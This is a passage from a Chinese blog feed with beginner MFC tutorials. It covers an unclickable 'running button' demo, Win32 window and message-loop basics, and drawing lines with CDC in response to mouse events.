title="结语"></a>结语</h1><p>重载button类，是因为之前的<code>OnMouseMove</code>是基于对话框的，那么控件和对话框之间其实有一个z轴，不是一个平级的关系，所以在对话框中写鼠标移动，当鼠标进入到控件的时候，这个消息则是控件捕捉到的，跟对话框就没了关系。</p><p>而重载button类之后，我们鼠标移动的消息是发生在button上，自然就跟对话框没啥关系，所以当鼠标要滑动到其中一个按钮的时候就会立刻响应我们消息中的代码隐藏自身，启用另一个。</p><p>也是因为这种特性，所以是点不到这个按钮了。</p><p>即便是给按钮加选中之后弹出消息</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CRunningButtonDlg::OnBnClickedBtnRight</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;恭喜你点到了&quot;</span>),_T(<span class="string">&quot;成功!&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为俩按钮效果一样，函数就不多写一个了，在列表里关联的时候让左边的按钮也关联这个函数消息就行了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">BEGIN_MESSAGE_MAP</span>(CRunningButtonDlg, CDialogEx)</span><br><span class="line"><span class="built_in">ON_WM_PAINT</span>()</span><br><span class="line"><span class="built_in">ON_WM_QUERYDRAGICON</span>()</span><br><span class="line"><span class="built_in">ON_WM_MOUSEMOVE</span>()</span><br><span class="line"><span class="built_in">ON_BN_CLICKED</span>(IDC_BTN_RIGHT, &amp;CRunningButtonDlg::OnBnClickedBtnRight)</span><br><span class="line"><span class="built_in">ON_BN_CLICKED</span>(IDC_BTN_LEFT, &amp;CRunningButtonDlg::OnBnClickedBtnRight)</span><br><span class="line"><span class="built_in">END_MESSAGE_MAP</span>()</span><br></pre></td></tr></table></figure><p>不过这一步做不做都一样反正点击不到这个按钮，除非你注释掉重载按钮的鼠标移动消息</p><img src="/2022/08/02/escapeButton/006.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> MFC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MFC基础</title>
      <link href="/2022/07/25/mfc01/"/>
      <url>/2022/07/25/mfc01/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>微软基础类库（英语：Microsoft Foundation Classes，简称MFC）是微软公司提供的一个类库（class libraries），以C++类的形式封装了Windows API，并且包含一个应用程序框架，以减少应用程序开发人员的工作量。其中包含大量Windows句柄封装类和很多Windows的内建控件和组件的封装类。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="MFC为何物"><a href="#MFC为何物" class="headerlink" title="MFC为何物"></a>MFC为何物</h2><p>传统手工业，需要很多人，然后手工去操作，对于厂家而言，人工费高，质量不确定。<br>而改用机器后，只需要投入材料，一天内的效应会大于人工，而且质量比较平均，当然不是所有的传统手工业都能被机器代替，只是部分。</p><p>这也就是普通c&#x2F;c++代码和api的区别，经过多次封装它自然就变得看起来简单，复用性高。</p><p>MFC既然是微软设计的，自然只适合在windows上做应用开发，像xp、win7、win10兼容性肯定没得说，毕竟也是个亲儿子。<br>不过目前的更新迭代之下，MFC的场景也会比较少，后面还有个跨平台的Qt。<br>虽然少，但是老公司的项目没有转型之前，大部分还是需要维护的。<br>可能外包比较多。</p><p>MFC的学习方式</p><ol><li>(1.c++多态、2.windows消息循环、3.msg loop)</li><li>查文档，不会就查，可以用vs的ide在函数上按f1跳转，也可以记网址</li></ol><p>安装：xxxx自己百度，vs的ide模块化其实看得很清楚了，就是吃内存。</p><blockquote><p>vs2022应该是C++ ATL for v143生成工具和c++ MFC for v143生成工具，都是x86和x64。</p></blockquote><p>MFC能做啥</p><ol><li>微软的基础框架</li><li>桌面应用</li><li>上位机</li><li>pc端的监控软件</li><li>修改注册表&#x2F;启动项等</li></ol><hr><h2 id="前身Win32"><a href="#前身Win32" class="headerlink" title="前身Win32"></a>前身Win32</h2><h3 id="1-窗口程序架构"><a href="#1-窗口程序架构" class="headerlink" title="1.窗口程序架构"></a>1.窗口程序架构</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">WinMain</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//设计窗口外观以及交互响应</span></span><br><span class="line">    <span class="built_in">RegisterClass</span>(...)</span><br><span class="line">    <span class="comment">//生产窗口</span></span><br><span class="line">    <span class="built_in">CreateWinodw</span>(...)</span><br><span class="line">    <span class="comment">//显示窗口</span></span><br><span class="line">    <span class="built_in">ShowWindow</span>(...)</span><br><span class="line">    <span class="comment">//刷新窗口</span></span><br><span class="line">    <span class="built_in">UpdateWindow</span>(...)</span><br><span class="line">    <span class="comment">//消息循环</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">GetMessage</span>(...))&#123;</span><br><span class="line">        <span class="comment">//消息转发</span></span><br><span class="line">        <span class="built_in">TranslateMessage</span>(...);</span><br><span class="line">        <span class="comment">//消息分发</span></span><br><span class="line">        <span class="built_in">DispatchMessage</span>(...);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="2-API和SDK"><a href="#2-API和SDK" class="headerlink" title="2.API和SDK"></a>2.API和SDK</h3><p>api全称(Application Program Interface) 应用程序编程接口<br>sdk全称(Software Development Kit) 也就是软件开发工具包，一般会包括API接口文档、示例文档、帮助文档、使用手册和相关工具。</p><hr><h3 id="3-窗口和句柄"><a href="#3-窗口和句柄" class="headerlink" title="3.窗口和句柄"></a>3.窗口和句柄</h3><p>窗口就是屏幕上的一片特定区域，可能存在等待接收用户的输入，显示程序的输出。可以包含标题栏、菜单栏、工具栏、空间等<br>句柄(handle)(资源的编号、二级指针)，窗口句柄、文件句柄、数据库连接句柄，本质都是指针<br>c++窗口类对象和窗口并不是一回事，二者的关系是c++窗口类内部定义了一个窗口句柄变量，保存了这个c++窗口类对象和相关的窗口句柄。当窗口销毁时，与之对应的c++窗口类对象销毁与否要看生命周期结束没。反之c++窗口类对象销毁时，与之相关的窗口肯定被销毁了。</p><hr><h3 id="4-消息循环"><a href="#4-消息循环" class="headerlink" title="4.消息循环"></a>4.消息循环</h3><img src="/2022/07/25/mfc01/000.png" class=""><p>银行这种，一般都是个人业务比较多。取个号要么机器上操作，要么去柜台。</p><img src="/2022/07/25/mfc01/001.png" class=""><p>对于windows系统而言，这种循环好看懂一些。</p><p>消息循环会引出一个<code>回调函数</code>。<br>就是说当出现特定事件的时候，都会交给回调函数处理。</p><hr><h3 id="5-变量命名约定"><a href="#5-变量命名约定" class="headerlink" title="5.变量命名约定"></a>5.变量命名约定</h3><table><thead><tr><th>前缀</th><th>含义</th><th>前缀</th><th>含义</th></tr></thead><tbody><tr><td>a</td><td>数组array</td><td>b</td><td>布尔值bool</td></tr><tr><td>by</td><td>无符号字符[字节]</td><td>c</td><td>字符[字节]</td></tr><tr><td>cb</td><td>字节计数</td><td>rgb</td><td>保存颜色值的长整型</td></tr><tr><td>cx，cy</td><td>短整型[计算x，y的长度]</td><td>dw</td><td>无符号长整型</td></tr><tr><td>fn</td><td>函数</td><td>h</td><td>句柄</td></tr><tr><td>i</td><td>整型</td><td>m_</td><td>类的数据成员member</td></tr><tr><td>n</td><td>短整型或整型</td><td>np</td><td>近指针</td></tr><tr><td>p</td><td>指针</td><td>l</td><td>长整型</td></tr><tr><td>lp</td><td>长指针</td><td>s</td><td>字符串string</td></tr><tr><td>sz</td><td>以0结尾的字符串</td><td>tm</td><td>正文大小</td></tr><tr><td>w</td><td>无符号整型</td><td>x，y</td><td>无符号整型[表示x，y的坐标]</td></tr></tbody></table><p>反正windows的产品基本都遵循这样的命名规范。</p><hr><h2 id="MFC程序开发流程"><a href="#MFC程序开发流程" class="headerlink" title="MFC程序开发流程"></a>MFC程序开发流程</h2><hr><h3 id="1-基于对话框的程序"><a href="#1-基于对话框的程序" class="headerlink" title="1.基于对话框的程序"></a>1.基于对话框的程序</h3><p>无菜单栏、工具栏，界面很简单，可使用此类型为对话框。</p><img src="/2022/07/25/mfc01/004.png" class=""><p>类似于计算器这种</p><hr><h3 id="2-基于文档-x2F-试图的程序"><a href="#2-基于文档-x2F-试图的程序" class="headerlink" title="2.基于文档&#x2F;试图的程序"></a>2.基于文档&#x2F;试图的程序</h3><p>标准的windows应用界面，包含菜单栏、工具栏、状态栏等。</p><img src="/2022/07/25/mfc01/005.png" class=""><p>最直观的就是vs的ide喽</p><hr><h3 id="3-MFC与win32开发的区别"><a href="#3-MFC与win32开发的区别" class="headerlink" title="3.MFC与win32开发的区别"></a>3.MFC与win32开发的区别</h3><ul><li>定制界面的区别(手写代码和拖放控件)</li><li>响应键鼠操作的区别(窗口处理函数和消息映射机制)</li></ul><p>win32可以开发纯命令行的程序，也就是windows所说的dos，在命令行里面gcc cmake之类的操作。<br>所以涉及到界面的开发自然而然的是选择MFC。</p><hr><h3 id="4-MFC消息映射机制"><a href="#4-MFC消息映射机制" class="headerlink" title="4.MFC消息映射机制"></a>4.MFC消息映射机制</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">BEGIN_MESSAGE_MAP</span>(CMFCApplication1Dlg, CDialogEx)</span><br><span class="line"><span class="built_in">ON_WM_SYSCOMMAND</span>()</span><br><span class="line"><span class="built_in">ON_WM_PAINT</span>()</span><br><span class="line"><span class="built_in">ON_WM_QUERYDRAGICON</span>()</span><br><span class="line"><span class="built_in">END_MESSAGE_MAP</span>()</span><br></pre></td></tr></table></figure><p><code>BEGIN_MESSAGE_MAP</code>即为消息映射表<br>如果有特殊需求也可以进行自定义消息。虽然不能说自定义就一定能达到需求。</p><hr><h3 id="5-构建项目"><a href="#5-构建项目" class="headerlink" title="5.构建项目"></a>5.构建项目</h3><p>vs有默认的项目类型可选，是提高效率的首要之选，不是说不可以从空项目起手，而是节约基础配置的时间。</p><img src="/2022/07/25/mfc01/002.png" class=""><img src="/2022/07/25/mfc01/003.png" class=""><img src="/2022/07/25/mfc01/006.png" class=""><p>至于共享dll编译出来的exe体积肯定是比使用静态库的exe要小。</p><img src="/2022/07/25/mfc01/007.png" class=""><p>默认就共享得了。有需要在使用静态。<br>然后此处基于对话框开发，所以文档模板属性没啥可选的。</p><img src="/2022/07/25/mfc01/008.png" class=""><p>用户界面常用的最小化最大化是可以勾上的，标题名呢也可以在此就设置好。</p><img src="/2022/07/25/mfc01/009.png" class=""><p>这些也可以看着来。</p><p>最后的生成的类一般不做修改。也别闲着用中文，每个人的环境不同，编码有异，在你这能跑在别人那就可能乱码了。</p><p>创建完成之后</p><img src="/2022/07/25/mfc01/010.png" class=""><p>其实就能看到大致的模板了。</p><img src="/2022/07/25/mfc01/011.png" class=""><p>跟预览的效果是一样的。这种直接套模板的确省去了不少麻烦。</p><blockquote><p>其中拖动控件的精髓在工具箱里，属性里面直接选消息。</p></blockquote><hr><h2 id="画线"><a href="#画线" class="headerlink" title="画线"></a>画线</h2><ul><li>知识点<ul><li>屏幕坐标和客户端坐标</li><li>设备上下文</li><li>事件</li></ul></li><li>起点和终点<ul><li>如何捕捉这两点，如左键为起点右键为终点</li></ul></li></ul><p>这次选择基于单个文档，其它倒是不用太在意</p><p>在创建完项目后看到很多头文件和源文件的时候，可以通过菜单栏的视图找到类视图</p><img src="/2022/07/25/mfc01/012.png" class=""><p>能够主要看清有哪些类。</p><p>启动项目后可以看到这样一个模板</p><img src="/2022/07/25/mfc01/013.png" class=""><p>要自己一开始就写肯定是不行的，所以这就是项目模板的好处，可以帮你完成很多基础的操作。<br>至于实现部分，可以通过类视图的类名去得到大意。</p><p>至于画线部分，拆分为两个地方，起点就是我们鼠标左键按下确定第一个点，然后随便他怎么拖动到其他地方然后再点击一下，即为线的终点。</p><p>至于这些鼠标按下抬起的消息，可以通过类视图右击打开属性，找到消息，能看到有很多。</p><img src="/2022/07/25/mfc01/014.png" class=""><img src="/2022/07/25/mfc01/015.png" class=""><p>然后选择这俩</p><img src="/2022/07/25/mfc01/016.png" class=""><p>也就是left button up和left button up，按下和松开</p><p>至于形参，可以转到定义查看<br><code>typedef unsigned int        UINT;</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CPoint</span> :</span><br><span class="line"><span class="keyword">public</span> tagPOINT</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">// Constructors</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// create an uninitialized point</span></span><br><span class="line"><span class="built_in">CPoint</span>() <span class="keyword">throw</span>();</span><br><span class="line"><span class="comment">// create from two integers</span></span><br><span class="line"><span class="built_in">CPoint</span>(</span><br><span class="line">_In_ <span class="type">int</span> initX,</span><br><span class="line">_In_ <span class="type">int</span> initY) <span class="keyword">throw</span>();</span><br><span class="line"><span class="comment">// create from another point</span></span><br><span class="line"><span class="built_in">CPoint</span>(_In_ POINT initPt) <span class="keyword">throw</span>();</span><br><span class="line"><span class="comment">// create from a size</span></span><br><span class="line"><span class="built_in">CPoint</span>(_In_ SIZE initSize) <span class="keyword">throw</span>();</span><br><span class="line"><span class="comment">// create from an LPARAM: x = LOWORD(dw) y = HIWORD(dw)</span></span><br><span class="line"><span class="built_in">CPoint</span>(_In_ LPARAM dwPoint) <span class="keyword">throw</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Operations</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// translate the point</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Offset</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ <span class="type">int</span> xOffset,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ <span class="type">int</span> yOffset)</span> <span class="title">throw</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Offset</span><span class="params">(_In_ POINT point)</span> <span class="title">throw</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Offset</span><span class="params">(_In_ SIZE size)</span> <span class="title">throw</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SetPoint</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ <span class="type">int</span> X,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ <span class="type">int</span> Y)</span> <span class="title">throw</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">BOOL <span class="keyword">operator</span>==(_In_ POINT point) <span class="type">const</span> <span class="built_in">throw</span>();</span><br><span class="line">BOOL <span class="keyword">operator</span>!=(_In_ POINT point) <span class="type">const</span> <span class="built_in">throw</span>();</span><br><span class="line"><span class="type">void</span> <span class="keyword">operator</span>+=(_In_ SIZE size) <span class="built_in">throw</span>();</span><br><span class="line"><span class="type">void</span> <span class="keyword">operator</span>-=(_In_ SIZE size) <span class="built_in">throw</span>();</span><br><span class="line"><span class="type">void</span> <span class="keyword">operator</span>+=(_In_ POINT point) <span class="built_in">throw</span>();</span><br><span class="line"><span class="type">void</span> <span class="keyword">operator</span>-=(_In_ POINT point) <span class="built_in">throw</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Operators returning CPoint values</span></span><br><span class="line">CPoint <span class="keyword">operator</span>+(_In_ SIZE size) <span class="function"><span class="type">const</span> <span class="title">throw</span><span class="params">()</span></span>;</span><br><span class="line">CPoint <span class="keyword">operator</span>-(_In_ SIZE size) <span class="function"><span class="type">const</span> <span class="title">throw</span><span class="params">()</span></span>;</span><br><span class="line">CPoint <span class="keyword">operator</span>-() <span class="function"><span class="type">const</span> <span class="title">throw</span><span class="params">()</span></span>;</span><br><span class="line">CPoint <span class="keyword">operator</span>+(_In_ POINT point) <span class="function"><span class="type">const</span> <span class="title">throw</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Operators returning CSize values</span></span><br><span class="line">CSize <span class="keyword">operator</span>-(_In_ POINT point) <span class="function"><span class="type">const</span> <span class="title">throw</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Operators returning CRect values</span></span><br><span class="line">CRect <span class="keyword">operator</span>+(_In_ <span class="type">const</span> RECT* lpRect) <span class="function"><span class="type">const</span> <span class="title">throw</span><span class="params">()</span></span>;</span><br><span class="line">CRect <span class="keyword">operator</span>-(_In_ <span class="type">const</span> RECT* lpRect) <span class="function"><span class="type">const</span> <span class="title">throw</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>一个是改了名的类型，一个则是类。</p><p>这个类中有两个字眼比较醒目，x和y。变相的能猜到肯定是记录了xy轴的坐标。<br>但是按住和松开肯定是会改变xy的，就需要自己定义两个变量去记录起始位置。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">CPoint m_start;<span class="comment">//起始位置，用于绘制线条</span></span><br><span class="line">CPoint m_stop;<span class="comment">//终止位置，用于绘制线条</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnLButtonDown</span><span class="params">(UINT nFlags, CPoint point)</span></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line">m_start = point;</span><br><span class="line">    CView::<span class="built_in">OnLButtonDown</span>(nFlags, point);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnLButtonUp</span><span class="params">(UINT nFlags, CPoint point)</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line">m_stop = point;</span><br><span class="line">CView::<span class="built_in">OnLButtonUp</span>(nFlags, point);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这打两个断点然后跑程序，随便点击一下，就能看到point的xy出现值了</p><img src="/2022/07/25/mfc01/017.png" class=""><p>然而坐标其实也有分别，像屏幕传统的都是1920*1080，说的就是x轴长1920，y轴长1080，而且比较有意思的是这个0，0坐标在屏幕的左上角。<br>屏幕坐标可称为screen point，而程序的坐标可称为client point。</p><p>有了这两个的区别，就可能导致获取到的xy坐标是有问题的。<br>除了基础的xy获取了之后，还要考虑这个信息会不会被其它消息所引用，有引用又得防着被修改了。</p><p>xy有了，那么要考虑绘制的问题。<br>要用到一个类<code>CDC</code><br>这里就不展示了，这个类的定义里面东西有点多。</p><p><code>// The device context</code>在注释中说明，这是一个设备的上下文<br>上下文：在画图中要绘制一些东西的时候，肯定会用到线条的粗细，线条的颜色，画图的大小，画图的大小状态比如最小化最大化和普通状态等许多参数信息，只有了解了所有的参数信息才能绘制出想要的东西。<br>为什么叫设备上下文：上述举例的上下文是属于窗口的上下文，而有其他的情况，你会把绘制的东西显示在显示器上，而不是单独的窗口。那么这种时候就需要获取到你这个屏幕的参数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnLButtonUp</span><span class="params">(UINT nFlags, CPoint point)</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line">m_stop = point;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取设备上下文</span></span><br><span class="line">CDC *pDC = <span class="built_in">GetDC</span>();</span><br><span class="line">pDC-&gt;<span class="built_in">MoveTo</span>(m_start);</span><br><span class="line"></span><br><span class="line">CView::<span class="built_in">OnLButtonUp</span>(nFlags, point);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在c++中结构体和类基本功能相通，区别在于类有私有成员。所以传递类并没有太大关系。<br><code>pDC-&gt;MoveTo(m_start);</code><br>moveto 就是说移动到我们的这个点上。然后才可以进行绘制线条之类的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnLButtonUp</span><span class="params">(UINT nFlags, CPoint point)</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line">m_stop = point;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取设备上下文</span></span><br><span class="line">CDC *pDC = <span class="built_in">GetDC</span>();</span><br><span class="line">pDC-&gt;<span class="built_in">MoveTo</span>(m_start);</span><br><span class="line">pDC-&gt;<span class="built_in">LineTo</span>(m_stop);</span><br><span class="line"><span class="built_in">ReleaseDC</span>(pDC);</span><br><span class="line"></span><br><span class="line">CView::<span class="built_in">OnLButtonUp</span>(nFlags, point);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>pDC-&gt;LineTo(m_stop);</code>line就是线呗，从按下鼠标左键的点到松开的点直接绘制一条直线。<br>并且要记住<code>ReleaseDC(pDC);</code>，避免占用导致程序异常。</p><p>然后就可以run了</p><img src="/2022/07/25/mfc01/018.png" class=""><p>鼠标左键按下直到某个点松开即可绘制出线条。</p><p>多画几条也没事，不过有点踩坑点：就是重绘的问题，此处就是当最大化和最小化的时候线条就莫得了。</p><p>除此之外，每次都需要滑动才能绘制，可能有点low。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">CPoint m_start;<span class="comment">//起始位置，用于绘制线条</span></span><br><span class="line">CPoint m_stop;<span class="comment">//终止位置，用于绘制线条</span></span><br><span class="line">BOOL m_status;<span class="comment">//绘制状态</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnLButtonDown</span><span class="params">(UINT nFlags, CPoint point)</span></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line">m_start = point;</span><br><span class="line">m_status = TRUE;</span><br><span class="line">    CView::<span class="built_in">OnLButtonDown</span>(nFlags, point);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnLButtonUp</span><span class="params">(UINT nFlags, CPoint point)</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line">m_stop = point;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取设备上下文</span></span><br><span class="line">CDC *pDC = <span class="built_in">GetDC</span>();</span><br><span class="line">pDC-&gt;<span class="built_in">MoveTo</span>(m_start);</span><br><span class="line">pDC-&gt;<span class="built_in">LineTo</span>(m_stop);</span><br><span class="line"><span class="built_in">ReleaseDC</span>(pDC);</span><br><span class="line">m_status = FALSE;</span><br><span class="line"></span><br><span class="line">CView::<span class="built_in">OnLButtonUp</span>(nFlags, point);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后新增消息，鼠标移动时。快捷操作就是类视图然后属性里面找到消息</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnMouseMove</span><span class="params">(UINT nFlags, CPoint point)</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line"><span class="keyword">if</span> (m_status)&#123;</span><br><span class="line"><span class="built_in">InvalidateRect</span>(<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果鼠标正在移动就进行操作</span></span><br><span class="line">CDC *pDC = <span class="built_in">GetDC</span>();</span><br><span class="line">pDC-&gt;<span class="built_in">MoveTo</span>(m_start);</span><br><span class="line">pDC-&gt;<span class="built_in">LineTo</span>(m_stop);</span><br><span class="line"><span class="built_in">ReleaseDC</span>(pDC);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CView::<span class="built_in">OnMouseMove</span>(nFlags, point);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>增加一个状态是为了考虑程序刚启动的时候鼠标可能就在绘制区域了，那么有可能m_start没能获取到值，那么后面的绘制就会出现一些问题。</p><p><strong>注：状态肯定要在构造函数里面初始化</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CMFCPaintView::<span class="built_in">CMFCPaintView</span>() <span class="keyword">noexcept</span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此处添加构造代码</span></span><br><span class="line">m_status = FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>InvalidateRect(NULL);</code>的作用<br>加了这个之后虽然绘制的线条没有刷新了，但是会接住前面的鼠标释放的点。看似连贯但是效果不对。<br>而没加这个，则是无论画多少条线都只会显示最近一次画的，也就是传统说法被刷新了或者叫重绘。</p><p>为了保证安全，再多加一个当前点位的变量。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CMFCPaintView::<span class="built_in">CMFCPaintView</span>() <span class="keyword">noexcept</span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此处添加构造代码</span></span><br><span class="line">m_status = FALSE;</span><br><span class="line">m_start = &#123; <span 